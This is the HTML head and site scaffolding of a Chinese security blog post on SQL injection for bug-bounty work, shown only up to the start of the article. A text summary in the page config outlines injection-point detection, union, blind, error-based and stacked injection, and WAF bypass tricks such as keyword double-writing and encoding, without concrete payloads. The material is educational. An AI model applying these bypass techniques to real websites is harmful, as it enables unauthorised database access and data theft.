<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>【SRC】SQL注入漏洞 | 嘻哈磕碜のBlogs</title><meta name="author" content="hihopkc"><meta name="copyright" content="hihopkc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="【SRC】SQL注入漏洞"><meta name="application-name" content="【SRC】SQL注入漏洞"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="【SRC】SQL注入漏洞"><meta property="og:url" content="https://hihopkc.github.io/posts/7410.html"><meta property="og:site_name" content="嘻哈磕碜のBlogs"><meta property="og:description" content="原理SQL注入就是供助网站上不健全的SQL拼接语句，将攻击者自己的payload拼接到原有的SQL语句中，使其在服务器上执行恶意SQL语句，使得攻击者可以对数据库进行网站运营者预料之外的增、删、改、查操作。 危害 脱库 查询隐藏数据，企业对于用户数据并不会直接删除，而是通过delete等字段去控制其"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202404092014272.jpg"><meta property="article:author" content="hihopkc"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202404092014272.jpg"><meta name="description" content="原理SQL注入就是供助网站上不健全的SQL拼接语句，将攻击者自己的payload拼接到原有的SQL语句中，使其在服务器上执行恶意SQL语句，使得攻击者可以对数据库进行网站运营者预料之外的增、删、改、查操作。 危害 脱库 查询隐藏数据，企业对于用户数据并不会直接删除，而是通过delete等字段去控制其"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="https://hihopkc.github.io/posts/7410"><link rel="preconnect" href="//cdn.cbd.int"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/swiper/swiper.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: {"enable":true,"title":"与数百名博主无限进步","addFriendPlaceholder":"昵称（请勿包含博客等字样）：\n网站地址（要求博客地址，请勿提交个人主页）：\n头像图片url（请提供尽可能清晰的图片，我会上传到我自己的图床）：\n描述：\n站点截图（可选）：\n"},
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"tianli","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"00af80c1b4c617346c21","Referer":"https://hihopkc.github.io/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 网站崩溃啦！","backTitle":"♪(^∇^*)又好了！"},
  LA51: undefined,
  greetingBox: undefined,
  twikooEnvId: 'https://hihopkc.space/',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: {"apiurl":"https://www.hihopkc.site/"},
  navMusic: false,
  mainTone: undefined,
  authorStatus: {"skills":null},
  algolia: {"appId":"R27EJ0K44Q","apiKey":"2631264c2276b5498f37a67d587bc878","indexName":"Demo","hits":{"per_page":6},"languages":{"input_placeholder":"输入关键词后按下回车查找","hits_empty":"找不到您查询的内容：${query}","hits_stats":"找到 ${hits} 条结果，用时 ${time} 毫秒"}},
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    simplehomepage: true,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: hihopkc","link":"链接: ","source":"来源: 嘻哈磕碜のBlogs","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#425AEF","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: '嘻哈磕碜のBlogs',
  title: '【SRC】SQL注入漏洞',
  postAI: '',
  pageFillDescription: '原理, 危害, 一般挖掘, 1、判断是否存在注入点, 2、构造轮子-找到可执行的函数或方法, 3、跑数据或拿权限造成进一步的危害, 判断是否存在注入点, 基于错误, 基于内容, 基于时间, 判断数据库类型能帮忙选择函数构造轮子, 端口判断, 系统架构, 报错信息判断, 借助工具判断, 借助注释符号, 借助函数判断, len和lenth, @@version和version(), substring substr, SQL注入分类, 数字型, 字符型注入, 提交方式分, 根据页面回显分, 联合注入, 前提条件, 利用, 布尔注入, 布尔型注入涉及函数, 时间盲注, 判定条件, 时间盲注与布尔盲注区别, 常用函数, 报错注入, 定义, 前提, 优缺点, 基本步骤, 报错注入函数, 报错注入函数详解, 堆叠注入, waf绕过, waf的定义, 处置流程, 判断waf的品牌, 云waf, 硬件 WAF, 软件 WAF, waf绕过思路(云息信安), 双写绕过, 等号 like 绕过(很常见的), andx2For 绕过, 大小写绕过, 逗号绕过, 等效函数替换绕过(很常见的), ascii 编码绕过(很常见的), 二次编码绕过(很推荐), 测试思路原理注入就是供助网站上不健全的拼接语句将攻击者自己的拼接到原有的语句中使其在服务器上执行恶意语句使得攻击者可以对数据库进行网站运营者预料之外的增删改查操作危害脱库查询隐藏数据企业对于用户数据并不会直接删除而是通过等字段去控制其是否可见这里利用的就是这一特性新增管理账户甚至极端条件下还可以完成获取服务器权限一般挖掘判断是否存在注入点发现存在注入点数字型法可用存在注入点数字型界面不发生改变界面发生改变并且直接界面变为界面发生改变数据包的长度发生改变构造轮子找到可执行的函数或方法语句可以使用这一步证明可以使用可以证明语句使用这一步去证明可以使用跑数据或拿权限造成进一步的危害跑两个参数第一个字母为就睡眠秒都睡眠秒判断是否存在注入点基于错误在参数后添加单引号或双引号甚至等形式返回包直接显示数据库的语句错误或与数据库相关的信息这种情况值得研究很有可能出货例基于内容基于内容的判断一般与有关系比如显示界面而显示界面这里就有注入当然是正常的界面基于内容判断注入点也可以和语句搭配如上述两者是相同的回显此情况下也是存在注入的基于时间页面成功回显且睡眠秒那么也是证明存在注入点的函数执行此函数会导致页面睡眠秒若函数执行成功页面会睡眠秒判断为真返回为若判断为假则返回为即判断数据库类型能帮忙选择函数构造轮子端口判断系统架构报错信息判断借助工具判断借助注释符号和和支持的注释符是子句查询标识符不支持多行查询因此如果返回错误则说明很可能是数据库借助函数判断和和函数和两者都可注入分类从注入参数类型分数字型注入字符型注入从注入效果分报错注入布尔注入延时注入联合注入堆叠注入宽字节注入从提交方式分注入注入头注入注入数字型后台对应的如下字段类型是数值型这种就是数值型注入肯定就是数字型字符型的字符型注入参数为字符比如输入的用户名和密码是字符串提交方式分注入使用请求提交数据比如注入使用请求提交数据比如表单注入使用的某个字段提交数据比如在中保存用户信息注入使用请求头提交数据比如检测中的源地址主机等根据页面回显分显注前端页面可以回显用户信息比如联合注入报错注入盲注前端页面不能回显用户信息比如布尔盲注时间盲注联合注入可合并多个查询的结果的合集顾名思义就是将一个表追加到另一个表后从而实现查询结果组合在一起在的参数位置中将构造的语句注入到参数位置中原始查询内容构造的内容前提条件存在注入点即未被过滤有显示位即能回显结果两表列数相同即或去判断列数数据类型相同利用判断是否存在注入点在参数位置修改参数值修改为后是否数据改变插入单双引号的检测方法常用未闭合的单引号会引起语句单引号未闭合的错误提示判断注入点还是整形或字符型语句闭环数字型通过字符串型闭合单引号测试语句进行判断判断查询列数或判断显示位报错回显用不存在的加上或者加上布尔注入当不知道数据库返回值的情况下时无回显输入和显示不一样仅返回正确或者错误的页面时存在布尔型盲注入原理假设为真则为真返回正确的界面为假返回错误的界面布尔型注入涉及函数所涉及的函数条件结果结果如果条件成立则输出结果否则输出结果字符串截取函数参数参数参数参数字符串参数开始截取的第几个字符参数截取的长度截断的第一个字符并判断若则返回错误返回获取长度函数通过构造以上函数可得参数参数参数结果结果结果结果相当于进行一个判断判断成功为错误为可根据判断输入攻击性代码得到数据时间盲注界面返回值只有一种无论输入任何值返回情况都会按正常的来处理加入特定的时间函数通过查看页面返回的时间差来判断注入的语句是否正确时间盲注与布尔盲注类似时间型盲注就是利用时间函数的延迟特性来判断注入语句是否执行成功判定条件什么情况下考虑使用时间盲注无法确定参数的传入类型整型加单引号加双引号返回结果都一样不会回显注入语句执行结果故无法使用注入不会显示报错信息故无法使用报错注入符合盲注的特征但不属于布尔型盲注时间盲注与布尔盲注区别时间盲注根据页面返回的时间差判断布尔盲注根据或来判断常用函数将程序挂起一段时间为秒判断语句如果第一个语句正确就执行第二个语句如果错误执行第三个语句使用函数和函数如果返回正确则页面会停顿秒返回错误则会立马返回只有指定条件的记录存在时才会停止指定的秒数报错注入定义报错注入就是利用了数据库的某些机制人为地制造错误条件使得查询结果能够出现在错误信息中前提页面上没有显示位但是必须有语句执行错误的信息优缺点优点不需要显示位如果有显示位建议使用联合查询缺点需要有语句的报错信息基本步骤构造目标查询语句选择报错注入函数构造报错注入语句拼接报错注入语句报错注入函数报错注入函数详解利用函数进行报错注入语法第一个参数文档名称第二个参数格式的字符串做内容定位第三个参数格式替换查找到的符合条件的值注意一次返回值最大为位当数据库名大于需要结合其他方式使用可以使用堆叠注入堆叠注入顾名思义就是将语句堆叠在一起进行查询原理很简单支持多条语句同时执行就是个分隔成堆的执行语句就同时执行以上两条命令所以我们可以增删改查只要权限够虽然这个注入姿势很牛逼但实际遇到很少其可能受到或者数据库引擎又或者权限的限制只有当调用数据库函数支持执行多条语句时才能够使用利用函数就支持多条语句同时执行但实际情况中如为了防止注入机制往往使用调用数据库的函数是函数其只能执行一条语句分号后面的内容将不会被执行所以可以说堆叠注入的使用条件十分有限一旦能够被使用将可能对网站造成十分大的威胁绕过的定义应用防火墙是通过执行一系列针对的安全策略来专门为应用提供保护的一款产品通俗来说就是产品里集成了一定的检测规则会对每个请求的内容根据生成的规则进行检测并对不符合安全规则的作出对应的防御处理从而保证应用的安全性与合法性处置流程预处理规则检测处理模块日志记录预处理预处理阶段首先在接收到数据请求流量时会先判断是否为请求之后会查看此请求是否在白名单之内如果该请求在白名单列表里直接交给后端服务器进行响应处理对于不在白名单之内的对数据包解析后进入到规则检测部分规则检测每一种产品都有自己独特的检测规则体系解析后的数据包会进入到检测体系中进行规则匹配检查该数据请求是否符合规则识别出恶意攻击行为处理模块针对不同的检测结果处理模块会做出不同的安全防御动作如果符合规则则交给后端服务器进行响应处理对于不符合规则的请求会执行相关的阻断记录告警处理日志记录在处理的过程中也会将拦截处理的日志记录下来方便用户在后续中可以进行日志查看分析判断的品牌判断是什么类型的是第一步根据类型可以选择或者之前的积累常见的云云主要利用技术通过移交域名解析权来实现安全防护用户的请求首先发送到云端节点进行检测如存在异常请求则进行拦截否则将请求转发至真实服务器阿里云盾腾讯应用防火墙华为应用防火墙安恒云应用防火墙玄武盾平台百度云应用防火墙华为云云防火墙安全狗云御应用防护系统知道创宇创宇盾应用防火墙分布式云奇安信网站卫士磐云网宿应用防火墙奇安信网神应用安全云防护系统安域腾讯云腾讯门神绿盟网站云防护启明星辰虚拟化深信服云应用防火墙云瑞数动态应用防火墙硬件硬件通常部署在服务器之前过滤所有外部访问流量并对请求包进行解析通过安全规则库的攻击规则进行匹配识别异常并进行请求阻断常见产品安恒明御应用防火墙长亭雷池下一代应用防火墙铱迅应用防护系统绿盟应用防护系统远江盛邦应用防护系统天融信应用安全防护系统深信服应用防火墙启明天清应用安全网关安全新一代软件软件安装在需要防护的服务器上通过监听端口或以容器扩展方式进行请求检测和阻断网站安全狗云锁盾网防护卫神智创宝塔网站防火墙网站卫视悬镜安骑士绕过思路云息信安双写绕过等号绕过很常见的有些开发修复就是简单的禁用了一些函数用替换掉等于号绕过替代字符等于等于等于等于目前主流的都会对对这些常见的注入检测语句进行拦截像这些还有字符代替字符如下等于等于等于等于所以可以转换成这样等于等于等于等于运算符用来判断表达式的值是否位于给出的列表中如果是返回值为否则返回值为用来判断表达式的值是否不存在于给出的列表中如果不是返回值为否则返回值为大小写绕过逗号绕过等效函数替换绕过很常见的尝试进行等效函数替换编码绕过很常见的当使用编码然后再进行对比时页面出现了内容说明当前数据库的库名是解码后是为什么编码可以绕过的有些网站还是会存在一个自动解析自动解析二次编码绕过很推荐两次编码测试思路判读是否存在注入点或者挖掘注入的核心是什么变是挖掘注入核心变你变变姿势页面变页面的变化报错页面直接的报错语句的报错时间注入页面的时间发生改变响应时间发生改变返回包会携带一些细微的变化有些可能只是细微的字符它有些是自动拦截的像雷池就是自动拦截拦截方式自动拦截手动拦截自动认为你是恶意攻击所以你也判断不了你有可能会以为是你注入成功了对面才拦截你其实不然它是自动拦截的判断是否存在注入点数字型字符型发现存在注入点数字型法可用存在注入点数字型的如果是很有可能就是字符型的构造轮子找到可执行的函数或方法可以使用和是差不多的效果那么很可能是有注入点的语句可以使用可以证明语句使用这一步去证明可以使用跑数据或拿权限造成进一步的危害跑两个参数第一个字母为就睡眠秒都睡眠秒',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-07-02 13:31:28',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><link rel="stylesheet" href="/css/style.css"><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://hihopkc-blog.oss-cn-shenzhen.aliyuncs.com/img/202303232356277.png"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">嘻哈磕碜のBlogs</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 归档</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><i class="anzhiyufont anzhiyu-icon-link faa-tada" style="font-size: 0.9em;"></i><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/equipment/"><i class="anzhiyufont anzhiyu-icon-dice-d20 faa-tada" style="font-size: 0.9em;"></i><span> 我的装备</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="wechat" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="alipay" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/ChatGpt/" style="font-size: 1.05rem;">ChatGpt<sup>2</sup></a><a href="/tags/Java/" style="font-size: 1.05rem;">Java<sup>1</sup></a><a href="/tags/MISC/" style="font-size: 1.05rem;">MISC<sup>2</sup></a><a href="/tags/MSF/" style="font-size: 1.05rem;">MSF<sup>1</sup></a><a href="/tags/Navicat/" style="font-size: 1.05rem;">Navicat<sup>1</sup></a><a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">Web安全<sup>9</sup></a><a href="/tags/binwalk/" style="font-size: 1.05rem;">binwalk<sup>1</sup></a><a href="/tags/docker/" style="font-size: 1.05rem;">docker<sup>3</sup></a><a href="/tags/hash/" style="font-size: 1.05rem;">hash<sup>1</sup></a><a href="/tags/hydra/" style="font-size: 1.05rem;">hydra<sup>1</sup></a><a href="/tags/java/" style="font-size: 1.05rem;">java<sup>1</sup></a><a href="/tags/john/" style="font-size: 1.05rem;">john<sup>1</sup></a><a href="/tags/mysql/" style="font-size: 1.05rem;">mysql<sup>1</sup></a><a href="/tags/oracle/" style="font-size: 1.05rem;">oracle<sup>1</sup></a><a href="/tags/owasp/" style="font-size: 1.05rem;">owasp<sup>1</sup></a><a href="/tags/phpstudy/" style="font-size: 1.05rem;">phpstudy<sup>1</sup></a><a href="/tags/python/" style="font-size: 1.05rem;">python<sup>1</sup></a><a href="/tags/redis/" style="font-size: 1.05rem;">redis<sup>1</sup></a><a href="/tags/shiro/" style="font-size: 1.05rem;">shiro<sup>1</sup></a><a href="/tags/sql/" style="font-size: 1.05rem;">sql<sup>1</sup></a><a href="/tags/ssrf/" style="font-size: 1.05rem;">ssrf<sup>1</sup></a><a href="/tags/tomcat/" style="font-size: 1.05rem;">tomcat<sup>1</sup></a><a href="/tags/wpscan/" style="font-size: 1.05rem;">wpscan<sup>1</sup></a><a href="/tags/xss/" style="font-size: 1.05rem;">xss<sup>2</sup></a><a href="/tags/%E5%AE%B9%E5%99%A8/" style="font-size: 1.05rem;">容器<sup>1</sup></a><a href="/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/" style="font-size: 1.05rem;">弱口令<sup>1</sup></a><a href="/tags/%E6%8A%A4%E7%BD%91/" style="font-size: 1.05rem;">护网<sup>1</sup></a><a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93/" style="font-size: 1.05rem;">数据库<sup>2</sup></a><a href="/tags/%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/" style="font-size: 1.05rem;">测试工具<sup>1</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span><a class="card-more-btn" href="/archives/" title="查看更多">
    <i class="anzhiyufont anzhiyu-icon-angle-right"></i></a></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/07/"><span class="card-archive-list-date">七月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/05/"><span class="card-archive-list-date">五月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">6</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/04/"><span class="card-archive-list-date">四月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/03/"><span class="card-archive-list-date">三月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">11</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/02/"><span class="card-archive-list-date">二月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">2</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2024/01/"><span class="card-archive-list-date">一月 2024</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">14</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/12/"><span class="card-archive-list-date">十二月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">9</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2023/11/"><span class="card-archive-list-date">十一月 2023</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">14</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url">网络安全</a><i class="anzhiyufont anzhiyu-icon-angle-right post-meta-separator"></i><i 